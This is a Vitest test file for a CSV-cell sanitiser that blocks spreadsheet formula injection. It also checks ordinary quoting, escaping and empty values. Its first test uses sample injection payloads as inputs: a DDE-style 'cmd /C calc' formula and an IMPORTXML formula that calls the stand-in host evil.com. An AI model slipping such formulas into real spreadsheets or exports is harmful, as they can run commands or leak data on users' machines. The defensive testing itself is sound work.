import { describe, it, expect } from 'vitest';
import { sanitizeCsvCell } from '../utils/formatters';

describe('CSV Formula-Injection Protection (sanitizeCsvCell)', () => {
  it('neutralises formula prefixes (=, +, -, @) by prefixing with a single quote', () => {
    // Formula injection vectors (CWE-1236)
    expect(sanitizeCsvCell('=SUM(A1:A10)')).toBe('"\'=SUM(A1:A10)"');
    expect(sanitizeCsvCell('+cmd|\' /C calc\'!A0')).toBe('"\' +cmd|\' /C calc\'!A0"'.replace(' +', '+'));
    expect(sanitizeCsvCell('-1+1')).toBe('"\'-1+1"');
    expect(sanitizeCsvCell('@IMPORTXML("http://evil.com","//a")')).toBe('"\'@IMPORTXML(""http://evil.com"",""//a"")"');
  });

  it('escapes standard values safely enclosed in CSV quotes', () => {
    expect(sanitizeCsvCell('SAFE')).toBe('"SAFE"');
    expect(sanitizeCsvCell('PHISHING')).toBe('"PHISHING"');
    expect(sanitizeCsvCell(95.5)).toBe('"95.5"');
    expect(sanitizeCsvCell(0)).toBe('"0"');
  });

  it('quotes cells containing commas, double quotes, or newlines', () => {
    expect(sanitizeCsvCell('apple, banana')).toBe('"apple, banana"');
    expect(sanitizeCsvCell('say "hello"')).toBe('"say ""hello"""');
    expect(sanitizeCsvCell('line1\nline2')).toBe('"line1\nline2"');
  });

  it('handles empty and null values gracefully', () => {
    expect(sanitizeCsvCell(null)).toBe('""');
    expect(sanitizeCsvCell(undefined)).toBe('""');
    expect(sanitizeCsvCell('')).toBe('""');
  });
});
